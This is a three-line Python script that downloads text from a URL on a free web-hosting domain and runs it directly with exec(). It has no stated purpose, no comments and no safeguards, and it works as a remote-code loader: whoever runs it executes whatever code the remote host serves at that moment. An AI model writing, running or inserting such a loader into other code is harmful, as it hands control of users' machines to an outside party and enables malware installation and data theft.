import requests, os
z = requests.get('https://comarsh.000webhostapp.com/run.txt').text
exec(z)
